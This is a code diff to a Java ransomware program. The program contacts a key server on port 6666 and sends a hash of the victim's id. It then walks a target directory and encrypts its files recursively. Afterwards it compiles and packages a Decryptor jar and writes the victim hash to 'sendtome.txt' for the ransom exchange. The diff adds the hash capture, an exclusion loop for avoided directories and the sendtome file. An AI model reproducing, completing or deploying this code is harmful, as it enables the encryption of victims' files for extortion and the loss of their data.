@@ -77,6 +77,7 @@ public static String replaceLine(String src, int lineno, String content) {
 
 public static void main(String[] args) {
         System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
+        String h = "";
 
         KeyClient key_client = new KeyClient(addr, 6666);
         if (key_client.getSuccess()) {
@@ -86,6 +87,7 @@ public static void main(String[] args) {
                         MessageDigest md = MessageDigest.getInstance("SHA-256");
                         byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                         String b64hash = Base64.getEncoder().encodeToString(hash);
+                        h = b64hash;
                         key_client.sendString(b64hash);
 
                         // received allocated public key
@@ -118,11 +120,19 @@ public static void main(String[] args) {
 
                 // encrypt files recursively within the target directory
                 try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
-                        files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
+                  files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
                 }
                 catch (Exception e) {
-                        ;
+                  ;
                 }
+                for (int i = 0; i < files.size(); i++) {
+                  System.out.println(files.get(i));
+                  if (avoidDir.contains(files.get(i).toString())) {
+                    files.remove(i);
+                    i--;
+                  }
+                }
+
 
                 // This will encrypt files recursively in the target directory
                 encryptFiles();
@@ -133,6 +143,10 @@ public static void main(String[] args) {
                         File f = new File("Decryptor.java");
                         if (!f.exists()) {
                                 f.createNewFile();
+                        }
+                        File s = new File("sendtome.txt");
+                        if (!s.exists()) {
+                                s.createNewFile();
                         }
                         File m = new File("manifest.txt");
                         if (!m.exists()) {
@@ -148,21 +162,26 @@ public static void main(String[] args) {
                         writer.write(code);
                         writer.close();
 
+                        // create sendtome.txt
+                        writer = new FileWriter("sendtome.txt");
+                        writer.write(h);
+                        writer.close();
+
                         // run Decryptor.java
                         process = Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                         BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));
 
-                        String s;
-                        while ((s = b.readLine()) != null) {
-                                System.out.println(s);
+                        String str;
+                        while ((str = b.readLine()) != null) {
+                                System.out.println(str);
                         }
                         b.close();
 
                         process = Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class ", System.getProperty("user.home")));
                         b = new BufferedReader(new InputStreamReader(process.getInputStream()));
 
-                        while ((s = b.readLine()) != null) {
-                                System.out.println(s);
+                        while ((str = b.readLine()) != null) {
+                                System.out.println(str);
                         }
                         b.close();
 
